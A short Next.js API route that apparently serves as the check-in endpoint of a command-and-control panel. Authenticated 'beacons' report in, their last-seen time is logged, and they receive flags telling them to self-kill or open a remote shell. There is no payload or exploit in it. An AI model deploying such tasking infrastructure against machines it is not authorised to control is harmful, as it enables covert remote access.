import { NextResponse } from 'next/server';
import db from '@/lib/db';

export async function POST(req: Request) {
  const body = await req.json().catch(() => null);
  if (!body?.beacon_id) return NextResponse.json({ error: 'beacon_id required' }, { status: 400 });

  // Verify beacon secret
  const expectedSecret = (db.prepare("SELECT value FROM settings WHERE key = 'beacon_secret'").get() as { value: string } | undefined)?.value;
  if (!expectedSecret || body.beacon_secret !== expectedSecret) {
    return NextResponse.json({ error: 'unauthorized' }, { status: 403 });
  }

  const beacon = db.prepare('SELECT id, kill, shell_requested FROM beacons WHERE beacon_id = ?').get(body.beacon_id) as { id: number; kill: number; shell_requested: number } | undefined;
  if (!beacon) return NextResponse.json({ error: 'unknown beacon' }, { status: 404 });

  const now = Math.floor(Date.now() / 1000);
  db.prepare('UPDATE beacons SET last_seen = ? WHERE id = ?').run(now, beacon.id);
  db.prepare('INSERT INTO heartbeats (beacon_id, ts) VALUES (?, ?)').run(beacon.id, now);

  return NextResponse.json({ ok: true, kill: beacon.kill === 1, shell: beacon.shell_requested === 1 });
}
